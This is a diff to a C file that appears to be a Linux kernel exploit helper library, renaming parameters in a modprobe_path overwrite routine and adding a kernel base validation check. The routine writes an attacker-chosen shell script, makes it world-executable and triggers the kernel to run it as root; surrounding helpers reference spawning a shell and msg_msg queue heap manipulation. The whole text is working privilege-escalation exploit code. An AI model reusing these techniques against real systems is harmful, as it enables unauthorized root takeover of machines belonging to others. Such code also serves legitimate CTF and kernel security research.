@@ -70,20 +70,20 @@ void spawn_shell() {
     exit(0); // avoid ugly segfault
 }
 
-void modprobe_attack(const char *cmd, const char *dummy_path, const char *devious_path) {
+void modprobe_attack(const char *cmd, const char *trigger_path, const char *evil_path) {
     printf("[SANITY] modprobe path: ");
     system("cat /proc/sys/kernel/modprobe");
 
     char buf[0x400] = {0};
     if (cmd == NULL) warn("modprobe_attack: cmd is NULL");
-    if (dummy_path == NULL) dummy_path = DEFAULT_FAKE_MODPROBE_PATH;
-    if (devious_path == NULL) devious_path = DEFAULT_DEVIOUS_MODPROBE_PATH;
+    if (trigger_path == NULL) trigger_path = DEFAULT_MODPROBE_TRIGGER;
+    if (evil_path == NULL) evil_path = DEFAULT_EVIL_MODPROBE_PATH;
 
     // snprintf(buf, sizeof(buf)-1, "echo -ne '\\xff\\xff\\xff\\xff' > %s", fake_path);
     // system(buf);
 
-    printf("[WRITE] dummy modprobe: %s\n", dummy_path);
-    int dummy_fd = open(dummy_path, O_CREAT|O_WRONLY, 0777);
+    printf("[WRITE] dummy modprobe: %s\n", trigger_path);
+    int dummy_fd = open(trigger_path, O_CREAT|O_WRONLY, 0777);
     if (dummy_fd < 0) {
         error("open");
     }
@@ -91,18 +91,18 @@ void modprobe_attack(const char *cmd, const char *dummy_path, const char *deviou
     write(dummy_fd, buf, 0x4);
     close(dummy_fd);
 
-    printf("[WRITE] devious modprobe: %s\n", devious_path);
+    printf("[WRITE] devious modprobe: %s\n", evil_path);
     memset(buf, 0, sizeof(buf));
-    snprintf(buf, sizeof(buf)-1, "echo '#!/bin/sh\n%s\n' > %s" , cmd, devious_path);
+    snprintf(buf, sizeof(buf)-1, "echo '#!/bin/sh\n%s\n' > %s" , cmd, evil_path);
     system(buf);
 
     puts("[PERM] giving exec perm");
     memset(buf, 0, sizeof(buf));
-    snprintf(buf, sizeof(buf)-1, "chmod 777 %s; chmod 777 %s", dummy_path, devious_path);
+    snprintf(buf, sizeof(buf)-1, "chmod 777 %s; chmod 777 %s", trigger_path, evil_path);
     system(buf);
 
     info("Run unknown file");
-    system(dummy_path); // trigger modprobe
+    system(trigger_path); // trigger modprobe
 }
 
 int create_msg_queue() {
@@ -153,6 +153,13 @@ msg_msg_buf* peek_msg(int msqid, size_t size) {
 void dump_hex(char *buf, size_t size) {
     for(int i = 0; i < size/8; i++) {
         printf("[*] buffer[%d]: 0x%lx\n", i, ((unsigned long *)buf)[i]);
+    }
+}
+
+void validate_kbase() {
+    info2("kernel base", kbase);
+    if ((kbase & 0xffffffff00000000) != 0xffffffff00000000 || (kbase & 0xfffff) != 0x00000) {
+        panic("failed to calculate kernel base");
     }
 }
 
